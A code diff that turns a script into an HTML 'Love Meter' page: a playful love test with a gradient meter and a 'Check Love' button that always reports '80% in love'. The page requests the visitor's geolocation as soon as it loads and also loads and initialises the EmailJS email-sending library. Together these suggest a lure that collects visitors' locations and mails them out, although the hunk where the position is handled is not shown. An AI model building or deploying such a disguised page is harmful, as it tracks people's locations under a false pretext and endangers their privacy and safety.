@@ -1,4 +1,19 @@
-// Ask location when page loads
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Love Meter ❤️</title>
+  <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script>
+  (function(){
+
+     emailjs.init({
+        publicKey: "YOUR_PUBLIC_KEY",
+      });
+
+  // Ask location when page loads
   window.addEventListener("load", () => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
@@ -42,3 +57,58 @@
       document.getElementById('result').innerText = "Wow! You are 80% in love! 😍";
     }, 2000);
   }
+
+       })();
+</script>
+<style>
+  body {
+    font-family: 'Segoe UI', sans-serif;
+    background: linear-gradient(135deg, #ff4e50, #f9d423);
+    color: white;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+  }
+  h1 { margin-bottom: 20px; }
+  .meter-container {
+    width: 300px;
+    background: rgba(255,255,255,0.2);
+    border-radius: 50px;
+    overflow: hidden;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+  }
+  .meter-fill {
+    height: 30px;
+    background: linear-gradient(to right, #ff416c, #ff4b2b);
+    width: 0%;
+    transition: width 2s ease-out;
+  }
+  button {
+    margin-top: 20px;
+    padding: 12px 24px;
+    font-size: 18px;
+    border: none;
+    border-radius: 30px;
+    background: white;
+    color: #ff4b2b;
+    font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  }
+  button:hover { background: #ffe3e3; }
+</style>
+</head>
+<body>
+
+<h1>💖 Test Your Love! 💖</h1>
+<div class="meter-container">
+  <div class="meter-fill" id="meter"></div>
+</div>
+<button onclick="runLoveMeter()">Check Love ❤️</button>
+<p id="result"></p>
+
+</body>
+</html>
+
